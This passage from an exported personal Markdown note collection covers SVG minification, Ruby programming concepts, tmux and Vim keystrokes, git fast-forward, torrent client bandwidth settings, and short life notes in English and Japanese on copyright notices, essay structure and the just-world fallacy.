minify it. While almost negligeable for complex image, it makes for ridiculous
size for small icons.

[SVG Optimizer](https://github.com/svg/svgo) is a easy to use Nodejs-based CLI
tool for just this purpose: optimizing/minimizing SVG vector graphics files.

```sh
svgo image.svg -o image.min.svg
```


===

<!-- Source: computing/software/tabbing-bracing-style.md -->
<!-- URL: /computing/software/tabbing-bracing-style -->
<!-- Title: On Tabbing/Bracing Style -->
<!-- Wikilinks: [[computing/software/tabbing-bracing-style]], [[software/tabbing-bracing-style]], [[tabbing-bracing-style]] -->

---
date: 2020-12-21T09:20
---

# On Tabbing/Bracing Style

Tabbing/bracing style has been the subject for much debate.

In a larger sense, I believe these conversations are uninteresting. 

I actually like the new wave of automated source code formatting; it reduces
the amount of time passed on debating tab/space pros and cons, and it makes for
a cleaner, easier to read, formatted code.

It also take away the burden of choosing what style following, something I
absolutely spend too much time on.

As a "fun things to discuss" conversation, it could be fun to engage to, though
I haven't really given much thought to it and I can't seems to find any hard
pros/cons for either camp anyway[^1].

[^1]: With the exception maybe for tabs which sometimes don't render well on a terminal over SSH, but I'm sure this too can be set somehow.


===

<!-- Source: computing/software/tail-recursion.md -->
<!-- URL: /computing/software/tail-recursion -->
<!-- Title: Tail Recursion -->
<!-- Wikilinks: [[computing/software/tail-recursion]], [[software/tail-recursion]], [[tail-recursion]] -->

---
date: 2020-08-31T08:50
---

# Tail Recursion

A recursive function is said to be _tail recursive_ when the recursive call is
the last thing executed by the function.

This is in contrast with classic recursion where each and every function call
must be executed to completion in order to get the correct value.


```ruby
def fibonacci(n, tail1=1, tail2=1)
  if n == 1
    tail1
  elsif n == 2
    tail2
  else
    fibonacci(n - 1, tail2, tail2 + tail1)
  end
end
```

This solution is much faster than a non-tail recursion.


Sources:

* [Tail Recursion for Fibonacci - TutorialsPoint.dev](https://tutorialspoint.dev/algorithm/mathematical-algorithms/tail-recursion-fibonacci)
* [Tail Recursion - Programmer and Software Interview Questions and Answers](https://www.programmerinterview.com/recursion/tail-recursion/)


===

<!-- Source: computing/software/tmux-keystroke-idioms.md -->
<!-- URL: /computing/software/tmux-keystroke-idioms -->
<!-- Title: tmux Idioms in Kakoune -->
<!-- Wikilinks: [[computing/software/tmux-keystroke-idioms]], [[software/tmux-keystroke-idioms]], [[tmux-keystroke-idioms]] -->

---
date: 2022-03-31T15:22
---

tmux Idioms in Kakoune
======================

tmux is a *terminal multiplexer*: a software that allows multiple
Windows inside one terminal window.

Common Keystroke
----------------

All command are preceded by a **prefix key**: `C-b` (`Ctrl` + `b`) by
default.

| Action                                                         | Keystroke     |
|----------------------------------------------------------------|---------------|
| Split screen in half from left to right                        | `%`           |
| Split screen in half from top to bottom                        | `"`           |
| Kill current pane                                              | `x`           |
| Switch to pane in whichever direction pressed                  | `<arrow key>` |
| Toggle full screen of current pane                             | `z`           |
| Create window                                                  | `c`           |
| Switch to window N                                             | `<number>`    |
| Detach from tmux, leaving everything running in the background | `d`           |


===

<!-- Source: computing/software/torrent-client-settings.md -->
<!-- URL: /computing/software/torrent-client-settings -->
<!-- Title: Torrent Client Settings -->
<!-- Wikilinks: [[computing/software/torrent-client-settings]], [[software/torrent-client-settings]], [[torrent-client-settings]] -->

---
date: 2021-04-25T11:06
---

# Torrent Client Settings

While probably not as important nowadays than back in the (slow)
cyberspace, I like to tweak my torrent client.

The most important factor is whether your client's port is forwarded or
not.

In order not to flood the upload speed, a good rule of thumb is to use 66%
of maximum upload bandwidth[^1]:

With a 100 Megabit/sec connection, one should use (100,000 / 8) * 0.66 =
8250 KiloBits/sec.

For other metrics like maximum number of connections per torrent or maximum
number of connections globally, I use the [Azureus U/L settings
calculator](http://infinite-source.de/az/az-calc.html). I enter the _Upload
speed of your connection_ and _Number of torrents you usually download
simultaneously_ (under _Preferences_).

For the seed, etiquette says[^2]:

> It is common courtesy to seed at least 1:1 so you are at least giving
> what you are taking.

Anything between 150% to 200% is probably fine.

For alternative speed settings, I use 60%-70% of the maximum
upload/download bandwidth and take 3 digits out. With a 100Mb/s connection
it limits torrents to around 1Mb/s.

[^1]: [How do I maximize my download speed?](https://transmissionbt.com/help/gtk/2.9x/html/Speed.html)
[^2]: [What Ratio Do You Seed Up To?](https://forum.bittorrent.com/topic/29437-what-ratio-do-you-seed-up-to/)


===

<!-- Source: computing/software/variable-scope-oop.md -->
<!-- URL: /computing/software/variable-scope-oop -->
<!-- Title: Variable Scope in Object Oriented Programming -->
<!-- Wikilinks: [[computing/software/variable-scope-oop]], [[software/variable-scope-oop]], [[variable-scope-oop]] -->

---
date: 2021-06-04T10:11
---

# Variable Scope in Object Oriented Programming

The rule of variable scope if different than that of [[local-variable-scope]] although
it shares some similarity. First we need to distinguish scope of _instance_
and _class_ (and _constants_).

## Instance Variable Scope

Instance variables (the one that starts with `@`) are scoped at the object
level. Local variable are accessible from every object's instance methods:

```ruby
class Flamingo
  def initialize
    @flying_sound = 'flap flap'
  end

  def listen
    @flying_sound
  end

  def speak
    @speak
  end
end

flamingo = Flamingo.new
flamingo.listen         # => 'flap flap'
flamingo.speak          # => nil
```

Contrary to local variable, referencing an uninitialized local variable
will not throw a `NameError`; you'd get `nil`.

{.ui .warning .message}
It is possible to initialize instance variable at the _class_ level. Those
are called _class instance variables_ but are out of scope (no pun
intended) of this note.

## Class Variable Scope

Class variables start with `@@` and are scoped at class level. They are
accessible from class methods. They are also accessible from instance
methods and are shared across all instances.

## Constant Variable Scope

Constant variables, usually called just _constants_ because you are not
supposed to re-assign them, are variables beginning with a capital letter
but generally written in all capitals. They have the trickiest scope:
_lexical scope_.

```ruby
class Animal
  LEGS = 4

  def leg_number
    "#{self.class} has #{LEGS} legs"
  end
end

class Flamingo < Animal
  LEGS = 2
end

puts Animal.new.leg_number    # => Animal has 4 legs
puts Flamingo.new.leg_number  # => Flamingo has 4 legs
```

The last line provides an unexpected output due to lexical scoping of the
constant `LEGS` initialized in the `Animal` class. `Flamingo` inherits
`Animal#leg_number` by way of inheritance from its superclass, but the call
to `to_s` (using `#{}`) passing in constant `LEGS` is done inside the
`Animal` class despite the inheritance. In this context, the first on only
constant named `LEGS` that Ruby sees is the one inside `Animal` class.

There are two ways to remedy to this situation:

- Overriding `Animal#leg_number` with `Flamingo#leg_number` method
- Using a scope resolution operator (`::`).

### Overriding

```ruby
class Animal
  LEGS = 4

  def leg_number
    "#{self.class} has #{LEGS} legs"
  end
end

class Flamingo < Animal
  LEGS = 2

  def leg_number
    "#{self.class} has #{LEGS} legs"
  end
end

puts Animal.new.leg_number    # => Animal has 4 legs
puts Flamingo.new.leg_number  # => Flamingo has 2 legs
```

By overriding `Animal#leg_number` with `Flamingo#leg_number`, we are
changing the scope form the superclass to the class. When looking for
constant `LEGS`, Ruby look inside the current scope and finds `LEGS = 2`.

### Scope Resolution Operator

```ruby
class Animal
  LEGS = 4

  def leg_number
    "#{self.class} has #{self.class::LEGS} legs"
  end
end

class Flamingo < Animal
  LEGS = 2
end

puts Animal.new.leg_number    # => Animal has 4 legs
puts Flamingo.new.leg_number  # => Flamingo has 2 legs
```

In this case, we are still in the context of the `Animal`, however we are
not looking for `LEGS` anymore : we are looking for `self.class::LEGS`.
Calling `self.class` is equivalent to calling the class of the current
instantiated object, i.e. `Flamingo`. What Ruby is doing is looking for
`Flamingo::LEGS` which exists, and is pointing to integer `2`.


===

<!-- Source: computing/software/variable-shadowing.md -->
<!-- URL: /computing/software/variable-shadowing -->
<!-- Title: Variable Shadowing -->
<!-- Wikilinks: [[computing/software/variable-shadowing]], [[software/variable-shadowing]], [[variable-shadowing]] -->

---
date: 2021-01-11T15:36
---

# Variable Shadowing

Variables shadowing is what happen when two local variables share the same name.

The variable in the inner scope _shadows_ the variable with the same name in
the outer scope, making the latter inaccessible in the inner scope, although
it should be (see [[local-variable-scope]]#).

```ruby
var = 'moon'

10.times do |var|
  puts "To the #{var}!"
end
```

In the example above, we cannot print `"To the moon!"` because the variable
lazily named `var` in the inner scope (the `do..end` block) is shadowing the
variable in the outer scope. In other word **we cannot access the outer `var`
because we have an inner  variable with the same name**.

Running Rubocop on this code can hint us on a possible bug:

```
3:14: W: Lint/ShadowingOuterLocalVariable: Shadowing outer local variable - var.
10.times do |var|
             ^^^
```



===

<!-- Source: computing/software/variables-as-pointers.md -->
<!-- URL: /computing/software/variables-as-pointers -->
<!-- Title: Variables as Pointers -->
<!-- Wikilinks: [[computing/software/variables-as-pointers]], [[software/variables-as-pointers]], [[variables-as-pointers]] -->

---
date: 2020-08-24T13:35
---

# Variables as Pointers

Variables are **pointers** to a place (or address space) in memory. This is a
very important concept to understand.

```ruby
a = "Baguette"

#    a = "Baguette"
#    ^        ^
#    |        |
# variable  object
```

_Label_ which refere to a **physical memory address** in the computer is another
term used to describe variables.


## Reassignment vs Mutability

Examples are probably the fastest way to get the point accross. Here is two to
illustrate the point above.


### Reassignment

First let's see what happen when we reassigne a variable to a completly different
address in memory:

```ruby
a = 'Hello there'
b = a

puts a  # Hello there
puts b  # Hello there

a = 'General Kenobi'

puts a  # General Kenobi
puts b  # Hello there
```

This can be schematized like this:

```
                             |
                             |  +---+             +------------------+
  a = 'Hello there'          |  | a |  -------->  | 'Hello there'    |
                             |  +---+             +------------------+
                             |
-----------------------------+------------------------------------------
                             |
                             |  +---+
                             |  | a |  ---+
                             |  +---+      \
                             |              \     +------------------+
  b = a                      |               +--> | 'Hello there'    |
                             |              /     +------------------+
                             |  +---+      /
                             |  | b |  ---+
                             |  +---+
                             |
-----------------------------+------------------------------------------
                             |
                             |  +---+             +------------------+
                             |  | a |  -------->  | 'General Kenobi' |
                             |  +---+             +------------------+
  a = 'General Kenobi'       |
                             |  +---+             +------------------+
                             |  | b |  -------->  | 'Hello there'    |
                             |  +---+             +------------------+
                             |
-----------------------------+------------------------------------------
```

`a = 'General Kenobi'` reassigned the variable `a` to a completely different
address in memory. It is now pointing to a new string.


### Mutability

```ruby
a = 'Hello'
b = a

puts a  # Hello
puts b  # Hello

a << ' there'

puts a  # Hello there
puts b  # Hello there
```

Using the principle of label we discussed above, we can illustrate the code
above like the schema below:

```
                             |
                             |  +---+             +------------------+
  a = 'Hello'                |  | a |  -------->  | 'Hello'          |
                             |  +---+             +------------------+
                             |
-----------------------------+------------------------------------------
                             |
                             |  +---+
                             |  | a |  ---+
                             |  +---+      \
                             |              \     +------------------+
  b = a                      |               +--> | 'Hello'          |
                             |              /     +------------------+
                             |  +---+      /
                             |  | b |  ---+
                             |  +---+
                             |
-----------------------------+------------------------------------------
                             |
                             |  +---+
                             |  | a |  ----+
                             |  +---+       \     +------------------+
  a << ' there'              |               +--> | 'Hello there'    |
                             |  +---+       /     +------------------+
                             |  | b |  ----+
                             |  +---+
                             |
-----------------------------+------------------------------------------
```

This time, `a << ' there'` results in **mutating the caller**, modifying the
existing string, which is also pointed to by the variable `b`.

Both `a` and `b` are pointing to the same thing.


{.ui .info .message}
Mutation are performed on **objects referenced by variables**, not variables
themselves.


Sources:

* [Variables as Pointers](https://launchschool.com/books/ruby/read/more_stuff#variables_as_pointers)
* [Variable References and Mutability of Ruby Objects](https://launchschool.com/blog/references-and-mutability-in-ruby)


===

<!-- Source: computing/software/vim-keystrokes.md -->
<!-- URL: /computing/software/vim-keystrokes -->
<!-- Title: Vim Keystrokes -->
<!-- Wikilinks: [[computing/software/vim-keystrokes]], [[software/vim-keystrokes]], [[vim-keystrokes]] -->

---
date: 2020-08-13
tags:
  - tips
---

# Vim Keystrokes

This is a list of keystroks that for the life of me I cannot remember and need
to check each time.


## Switching Case of Characters

lower case to UPPER CASE: `gU` or `g~` + movement

UPPER CASE to lower case: `gu` or `g~` + movement


## Comment/Uncomment Multiple Lines

{.ui .info .message}
The keystroke to select multiple line is common for all command.


1. Place the cursor to the first line you want to comment and press `Ctrl` +
`V` to put the editor in VISUAL BLOCK mode.
2. Using the arrow key (or h j k l) select every line to comment/uncomment.
3. Press `Shift` + `I` to put the editor in INSERT mode and then press `#` to comment or `x` to uncomment (delete).
4. Last, press `Esc` to insert a `#` character/delete every selected haracter
on all other selected lines.


## Refactoring Variables

1. Place cursor on variable to rename
2. Type `gd` (or `gD` for global variable)
3. `c` to change
4. `gn` to search for last used search pattern
5. Type variable's new name
6. `esc` to exit
7. `.` to repeat and apply to next occurences



===

<!-- Source: computing/software/what-is-fast-forward-in-git.md -->
<!-- URL: /computing/software/what-is-fast-forward-in-git -->
<!-- Title: What is fast-forward in git -->
<!-- Wikilinks: [[computing/software/what-is-fast-forward-in-git]], [[software/what-is-fast-forward-in-git]], [[what-is-fast-forward-in-git]] -->

---
date: '2023-06-04T11:58:23+0900'
---

# What is fast-forward in git

Fast-forward is one interesting thing that git can do.
When you are at a particular commit, and you merge some other branch in where that other branch has the current commit as a predecessor, it's not necessary to create any new snapshots or do any other fancy stuff.

Basically, the previous pointer to the commit can be moved to point to the new commit, to incorporate the new commit.

If looking at `git log` again, `main` is pointing to the same places wherever the new commit was pointing.

`git log --all --graph --decorate --oneline`


===

<!-- Source: computing/software/what-is-object-oriented-programming.md -->
<!-- URL: /computing/software/what-is-object-oriented-programming -->
<!-- Title: What is Object Oriented Programming -->
<!-- Wikilinks: [[computing/software/what-is-object-oriented-programming]], [[software/what-is-object-oriented-programming]], [[what-is-object-oriented-programming]] -->

---
date: 2021-03-31T08:56
---

# What is Object Oriented Programming

**Object Oriented Programming** or **OOP** is a programming paradigm created to
deal with the growing complexity of larger software systems.

OOP sections some area of the code to make the whole code interacts with only
small chunks of code. This make it easier to deal than chunking big blob of
dependencies that just wait to throw errors.

## Objets

OOP has **Object** in its name. Let's define it.

First, objects are created from **classes**. Classes are like molds. What
comes out of the mold in an **object**. Classes define the basic outlines
of what the object should be made of and what it should be able to do.

Defining a class in Ruby is pretty similar to defining a method:

```ruby
class RedPanda
end

rosa = RedPanda.new
```

After defining the `RedPanda` class, we created an _instance_ of it and
stored the result in the local variable `rosa`. Creating a new object or
instance from a class is called **instantiation**: we have _instantiated_
an object called `rosa` from the class `RedPanda`.

## Common Terminology

**Encapsulation** is hiding piece of functionality and making it unavailable to
the rest of the code base. See [[encapsulation]]#.

**Polymorphism** is the ability for different types of data to respond to a
common interface. It's what gives us the flexibility in using pre-written code
for new purposes. From the Greek _polymorphos_, _poly_ is a prefix which means
"many" and _morph_ means "form".

**Inheritance** is when a class inherits the behaviors of another class called
**superclass**. The class that inherits behaviors is called **subclass**.
Subclass lets programmer makes smaller, more fine-grained behavior,
derived from the superclass behaviors.

{.ui .message .info}
In Ruby, a class can only directly sub-class from one super class. This is
called a _single inheritance_.

See also [[inheritance-vs-association]]#.

**Mixins** are the result of the mix of a module (in Ruby) with a class. After
mixing with a module, the behaviors declared in that module are available to
the class and its objects. Where other programming languages allow classes
to directly inherit from multiple class (_multiple inheritance_), Ruby has
_mixing in_ behaviors.

**Modules** are collection of behaviors that are usable in other classes via
**mixins**. A module is _mixed in_ to a class unsing the `include` method
invocation. See also [[modules]]#.

```ruby
module Speak
  def speak(sound)
    puts sound
  end
end

class RedPanda
  include Speak
end

class Human
  include Speak
end

rosa = RedPanda.new
rosa.speak('キー')
alfred = Human.new
alfred.speak('Bonjour')
```

Both instance of the two classes `RedPanda` and `Human` have access to the
`speak` instance method thanks to the mixin of `Speak` module with both
classes.

Generally, a module is used when there is a _-able_ relationthip:
tow*able* (for truck), screw*able* (for bracket) etc.

**Namespacing** is the action of organizing similar classes under a common
module. Here, the module is used to group several similar or related classes.

```ruby
module Cutlery
  class Knife
    def cut(sound)
      sound
    end
  end

  class Spoon
    def dip(sound)
      sound
    end
  end
end

opinel = Cutlery::Knife.new
fleur_absinthe = Cutlery::Spoon.new
```

Classes in module are called by appending the name of the class to the name of
the module with two colons (`::`). This double colon is called a **scope
resolution operator**.

**Container** is a name given to modules which _contains_ methods, themselves
called module methods. This method is used to house method that seems out of
place within the code.

```ruby
module WoodenDoll
  class Kokeshi
  end

  def self.out_of_place_method(num)
    num ** 2
  end
end

value = WoodenDoll.out_of_place_method(4)
```

[[method-access-control]]#

**Collaborator objects** are objects that are stored as state within another
object. They are called _collaborators_ because they work in _collaboration_
with the class they are associated with.

```ruby
class Bookshelf
  attr_accessor :book
end

class Book
  attr_accessor :name

  def initialize(name)
    @name = name
  end
end

wood_bookshelf = Bookshelf.new
war_of_the_worlds = Book.new('War of the Worlds')

wood_bookshelf.book = war_of_the_worlds

puts wood_bookshelf.book.name  # => War of the Worlds
```

See [[approach-to-oop]]# for an example of how to attack a program with OOP
mindset.


===

<!-- Source: computing/software/working-collections.md -->
<!-- URL: /computing/software/working-collections -->
<!-- Title: Working with Collections -->
<!-- Wikilinks: [[computing/software/working-collections]], [[software/working-collections]], [[working-collections]] -->

---
date: 2020-09-29T22:31
---

# Working with Collections

A collection is a grouping (or organizing) of zero or more elements used to
solve the problem at hand. Often, collection are looped through using the
`loop` keyword or a method to that effect.


## Array

An array is a data object that stores **ordered list** of values. In other
programming language like Python, arrays are referred to as "lists".

They are written with square brackets (`[]`) and can be filled with any kind of
data object.

Arrays in Ruby are **zero-based**, meaning that when accessing their elements
with their numerical place, one should start at `0`. The second item is at
`1`, and so on. The address location in the array is accessed using integers.


```ruby
arr = ['one', 2, ['three']]

p arr[2] # => ["three"]
```

See also [[sorting-of-arrays]]#.

## Hash

A hash is data structure consisting of a key-value pairs. It is like an array
that can use any data type as its key (the hash equivalent of an index). In
other programming language like Python, hashes are referred t oas "dictionary".

Hashes are written using curly brackets (`{}`) but its notation is a little bit
more complicated than that of arrays because of hashes' need for **key** and
**value** pair (note also the older syntax until Ruby 1.9, called _hash
rocket_, but still used nowaday):

```ruby
hash_syntax_old = {:attack_titan => 'Eren Yeager'}
hash_syntax_new = {female_titan: 'Annie Leonhart'}
```

{.ui .message .info}
Although a key can be any data types, Hash are commonly created using _symbols_
as key and any data types as values. Note also that when not using symbols as
keys, we are forced to use the old syntax (i.e., `=>`).


### Hashes vs. Arrays

Deciding whether to use hash or array can be dauting at first. As a general
rule, one should use a hash when the data need to be associated with a specific
label. Otherwise, an array should be fine.

Also note that as of Ruby 1.9, hashes maintain order but arrays are still
prefered for ordered items.


## Range

Range is a kind of collection of ordered values. It is created on the go with a
low and high value separated by two or three dots (`..`, `...`) and surrounded
by parenthesis (`()`).

```ruby
(1..3).sum  # => 6
(1...3).sum # => 3
```
A range with two dots is inclusive, meaning it includes the high number. In
the example abobe: _for every number in 1 to 3, do something_.

A range with three dots is excluding: _for every number in 1 to 2, do something_.

A range's beginning and end doesn't need to be numbers. It can be letters:

```ruby
('a'..'c').to_a # => ["a", "b", "c"]
```

## Common Collection Methods

[[collection-methods]]#



===

<!-- Source: computing/software/written-assessment.md -->
<!-- URL: /computing/software/written-assessment -->
<!-- Title: Written Assessments -->
<!-- Wikilinks: [[computing/software/written-assessment]], [[software/written-assessment]], [[written-assessment]] -->

---
date: 2020-12-27T11:21
---

# Written Assessments

Example of question:

**Consider the following code: what does it return? What does it output?
Explain why and what concept it demonstrates.**

The response should include the following:

* Write down what the code output and what are the return values
* Explain why the code output/return what it does
* Summarize what the problem demonstrates and why

Each exercices should take on average 5min to solve.

* [[practice-problems-local-variable-scope]]#
* [[practice-problems-truthiness]]#
* [[practice-problems-variable-shadowing]]#


===

<!-- Source: computing/software/yielding.md -->
<!-- URL: /computing/software/yielding -->
<!-- Title: Yielding -->
<!-- Wikilinks: [[computing/software/yielding]], [[software/yielding]], [[yielding]] -->

---
date: 2021-06-09T10:14
---

# Yielding

In Ruby, the `yield` keyboard lets you invoke passed-in block argument from
within the method.

```ruby
def echo_with_yield(string)
  yield
  string
end

p echo_with_yield("Hello!") { puts "World" }
# => World
#    "Hello!"
```

The `yield` keyword executes the block (which is why words order above are
inversed).

## Conditional Block

Note that not passing a block here would have resulted in an error: `no
block given (yield) (LocalJumpError)`

This is usefull for method calls that _need_ a block passed as a parameter
but perhaps we want to write a method that may or may not use a block. This
is possible by using `Kernel#block_given?` method which is available
everywhere.

```ruby
def echo_with_yield(string)
  yield if block_given?
  string
end

p echo_with_yield("Hello!") { puts "World" }
# => World
#    "Hello!"
p echo_with_yield("Hello!")
# => "Hello!"
```


===

<!-- Source: d6cf318e.md -->
<!-- URL: /d6cf318e -->
<!-- Title: My First Zettel -->
<!-- Wikilinks: [[d6cf318e]] -->

---
date: 2020-07-31
---

# My First Zettel

I'm going to try to take more notes using the
[Zettelkasten](https://neuron.zettel.page/2011401.html) method and this cool
tool named [Neuron](https://neuron.zettel.page/).

* [[zettelkasten-principles]]#
* [[taking-notes]]#


===

<!-- Source: index.md -->
<!-- URL: // -->
<!-- Title: 外付け脳 (exobrain) -->
<!-- Wikilinks: [[index]] -->

---
tags: [home]
---

# 外付け脳 (exobrain)

Welcome to my exobrain, where I upload and share notes for everyone to see.

This exobrain uses [[zettelkasten-principles]] which lets me easily write down things I
want to remember and make association between notes and thoughts.

I also have [a blog](https://www.cyberflamingo.net/) where I write more
lengthy post about security and privacy, in Japanese (see also
[[what-language-should-i-write-in]]).

[[d6cf318e]]#

## Portals

* [[computing]]#
* [[life]]#

## Credits

I use the amazing [Neuron](https://neuron.zettel.page/) writen by the even
more amazing [Sridhar Ratnakumar](https://www.srid.ca/)!


===

<!-- Source: life.md -->
<!-- URL: /life -->
<!-- Title: Life -->
<!-- Wikilinks: [[life]] -->

---
date: '2020-08-03'
---

# Life

A collection of random thoughts and memos.

I've been interested in online privacy and its abuse, as well as how to clame
it back for quite some years now.

## Portals

-   [[privacy]]#
-   [[music]]#
-   [[japan]]#

### Other Thoughts and Memos

-   [[quotes]]#
-   [[lifestyle-business]]#
-   [[just-world-fallacy]]#
-   [[convert-decimal-degrees]]#
-   [[wikipedia-matters]]#
-   [[oneill-cylinder]]#

### Work Related

-   [[shipped-my-first-saas-side-project-while-working-full-time]]#
-   [[pricing-strategies]]#
-   [[charge-more]]#
-   [[objectives-and-key-results]]#


===

<!-- Source: life/charge-more.md -->
<!-- URL: /life/charge-more -->
<!-- Title: Charge More -->
<!-- Wikilinks: [[life/charge-more]], [[charge-more]] -->

---
date: '2020-08-31T15:24:25+0900'
---

# Charge More

Patrick McKenzie (patio11) has a lot of great advices and knows how to translate them.
There are a lot of advices to take from his blog, but the passage that struck with me the most is the following one:

> Let's talk about that heart surgeon again.
> Do you think he paid \$5.32 for that doohickey he just planted in you? No possible way.
> He probably paid \$500 or \$1000 for it.
> And, if it ever occurred to him to argue with the sales rep from HeartTech ("Technology with a Heart"), the conversation probably went something like this: "Thats an interesting perspective.
> I suppose you could try making it yourself for \$5.32... or, alternately, you could make \$49,500 tomorrow installing one and be on the golf course by 3:00." And then the good doctor's eyes lit up and the deal got closed.
> Thats essentially what your conversation with the customer should be: regardless of what it took to make my product, my price is a "fair" one because you'll get oh so much more out of it.
> And, seen in that light, most of your customers will agree.
> [Patrick McKenzie](https://www.kalzumeus.com/2006/08/14/you-can-probably-stand-to-charge-more/)


===

<!-- Source: life/convert-decimal-degrees.md -->
<!-- URL: /life/convert-decimal-degrees -->
<!-- Title: Convert Decimal Degrees into Degrees, Minutes, Seconds -->
<!-- Wikilinks: [[life/convert-decimal-degrees]], [[convert-decimal-degrees]] -->

---
date: 2020-08-17
---

# Convert Decimal Degrees into Degrees, Minutes, Seconds

A map's geographic coordinates can be given in Decimal Degrees (DD, like
121.135°) or in Degrees, Minutes and Seconds (DMS, like 121°8'6"), which is
more common.


## Conversion

Basic concept:

1. The whole units gives the degrees
2. Multiply the decimal portion by 60; the whole units gives the minutes
3. Again, multiply the decimal portion multiplied by 60; the whole units gives
the seconds
4. Puts the number together

Formula:

Knowing that `1° = 60' = 3600"`, let's say `dd = 121.135`

1. d = integer(dd) = 121°
2. m = integer((dd - d) * 60) = 8'
3. s = (dd - d - m / 60) * 3600 = 6"

---

Source: [How to Convert Decimal Degrees into Degrees, Minutes,
Seconds](https://www.thoughtco.com/decimal-degrees-conversion-1434592)


===

<!-- Source: life/japan.md -->
<!-- URL: /life/japan -->
<!-- Title: 日本 🇯🇵 -->
<!-- Wikilinks: [[life/japan]], [[japan]] -->

---
date: 2020-08-19
tags:
  - 日本語
---

# 日本 🇯🇵

* [[kishotenketsu]]#
* [[about-copyright]]#
* [[difference-shiyou-riyou]]#


===

<!-- Source: life/japan/about-copyright.md -->
<!-- URL: /life/japan/about-copyright -->
<!-- Title: 著作権の記載について -->
<!-- Wikilinks: [[life/japan/about-copyright]], [[japan/about-copyright]], [[about-copyright]] -->

---
date: 2020-08-18
---

# 著作権の記載について

著作権の記載方法は様々ありますが、どの記載が望ましいか法務に確認した。

原則に、
* 記載自体はした方が良い。勝手にコピーされることを多少なりとも抑止できるため
* 日本国内であれば、年の記載は不要
* 国外 (global) の利用の可能性があるなら年はあるべき


記載について、有事の際の牽制や抑止力を重視して、しっかりした記載をすることで下記は間違いないそうだ。

> Copyright &copy; 発行年−更新年 会社名 All Rights Reserved.


上記が難しい場合、最低限の記載はせめてこのとおり。

> \(c) 会社名

これに加えて、国際の場合は年を追記する。

なお、更新年を記載 ≠ 既存資料を毎年更新ではない。


===

<!-- Source: life/japan/difference-shiyou-riyou.md -->
<!-- URL: /life/japan/difference-shiyou-riyou -->
<!-- Title: 「使用」と「利用」の違い -->
<!-- Wikilinks: [[life/japan/difference-shiyou-riyou]], [[japan/difference-shiyou-riyou]], [[difference-shiyou-riyou]] -->

---
date: 2020-08-29T12:55
tags:
  - 日本語
---

# 「使用」と「利用」の違い

「**使用**」は本来の目的を意識しないで特定の目的のために物を役立てたり、
仕事をさせたりすること。

「**利用**」はその物の機能や利点を生かして用いることです。すなわち、
「利益になるよう用いる」、「使うことで役に立つ」という意味を含める。

ただし、物の機能や利益は人によって解釈が異なるので、厳密に使い分けることは文脈に
左右されるでしょう。


## 参照

[コトバ解説 「使用」と「利用」の違い](https://mainichi.jp/articles/20170217/mul/00m/040/00400sc)


===

<!-- Source: life/japan/kishotenketsu.md -->
<!-- URL: /life/japan/kishotenketsu -->
<!-- Title: 起承転結 -->
<!-- Wikilinks: [[life/japan/kishotenketsu]], [[japan/kishotenketsu]], [[kishotenketsu]] -->

---
date: 2020-08-19
tags:
  - 日本語
---

# 起承転結

日本の教育を受けたことがないため、当然一般的な文章の構成を教授してもらったことがない。

しかし、文章を書くきっかけが増えてきて、いい加減文章の構成を覚えなければならない。

日本でもっとも一般的な文章の構成は「[起承転結](https://ja.wikipedia.org/wiki/%E4%B8%89%E5%B9%95%E6%A7%8B%E6%88%90)」らしい。
まずそれを覚えよう。


## 起承転結

* **起:** 第一幕は物語の基本であり、シーンを設定する
* **承:** 第二幕は第一幕に続き、物語を展開させる
* **転:** 第三幕はクライマックスで、この中で予期せぬ出来事が起こる
* **結:** 第四幕は第三幕の動揺を考慮して結論を出す


### 事例

今後の参照のため、以前起承転結を使ったときのメモを残しておく。

RSA カンファレンスで行う予定だったプレゼンテーションはコロナで中止になったため、会社の[ブログ投稿](https://www.wantedly.com/companies/ubsecure/post_articles/228665)として再利用した。

もちろん、欧州人向けのプレゼンだったので日本人向けの書き方に変換するため起承転結を使って編集した。


* **起:** みんな寿司を握ってみたことはあるかい？実は、寿司とハッキングは似ているんだ。
* **承:** まずは TalkTalk の事件を見てくれ、実は知識のない子供が犯人だったんだ。
* **転:** ハッキングは高度なものと思われがちだけど、実は簡単なモノもある。そして、そんなレベルの攻撃でやられるシステムもまだまだ多い。
* **結:** だから、検査ツールで事前にチェックするのが大事。なにを使えばいいかって？それは Japan No.1 の Vex に決まっているね！！！


{.ui .info .message}
豆知識: フランスでは[三幕構成](https://ja.wikipedia.org/wiki/%E4%B8%89%E5%B9%95%E6%A7%8B%E6%88%90)がよく使われる。
三幕を**設定** (Set-up)、**対立** (Confrontation)、**解決** (Resolution) と紹介するが、フランス人はヘーゲルの弁証法の**正反合** (thesis, antithesis, synthesis) を使うことが多いと思う。


===

<!-- Source: life/just-world-fallacy.md -->
<!-- URL: /life/just-world-fallacy -->
<!-- Title: 公正世界誤謬 -->
<!-- Wikilinks: [[life/just-world-fallacy]], [[just-world-fallacy]] -->

---
date: 2020-08-18
---

# 公正世界誤謬

**公正世界誤謬** (こうせいせかいごびゅう、**just-world fallacy**)
とは、世界は人間の善悪の観念に従って運営されており、すべてが公平であり、良いことが良い人に起こり、悪いことが悪い人に起こるという誤った信念のことです。

世界には公正で正しいことが起こると信じたいという絶望的な願望から生まれたものです。
しかし、世界はあるがままのものです。優しくも残酷でもなく、公平でもなく、不公平でもない。

**誤解:** 人生のゲームで負けている人は、それに値する何かをしたに違いない。

**真実:** 幸運の受益者は、しばしばそれを得るために何もしない。悪い人は、結果が伴わない行動で逃げてしまうことが多い。

公正世界誤謬は安全の誤った感覚につながることがあります。自分は自分がコントロールできると感じたいので、悪い行動を避けている限り、自分に害はないと思い込んでいます。悪い行動をする人がホームレスになったり、妊娠したり、中毒になったり、レイプされたりすると思うと、より安全だと感じます。怠け者の詐欺師や詐欺師が出世するのは腹立たしいことです。心の底では、勤勉さと美徳が成功につながり、怠惰、悪、操作が破滅につながると信じたいと思っているので、その期待に合うようにまわりの世界を編集します[^1]。

世界は公平じゃないと思うのは最悪ですが、しかし、現実には、悪はしばしば繁栄し、その代償を支払うことは少ないです。

[^1]: [The Just-World Fallacy](https://youarenotsosmart.com/2010/06/07/the-just-world-fallacy/)


===

<!-- Source: life/lifestyle-business.md -->
<!-- URL: /life/lifestyle-business -->
<!-- Title: Lifestyle Business -->
<!-- Wikilinks: [[life/lifestyle-business]], [[lifestyle-business]] -->

---
date: 2020-08-10
---

# Lifestyle Business

This is an interesting concept I discovered some weeks ago: "lifestyle
business'.

Being on Twitter and to some extend in the _programming/startups_ culture of
the Bay Area, mosts dicussions centers around sucessful Angel-backed startups.

I was therefore shocked to learn about **lifestyle business**, a concept I
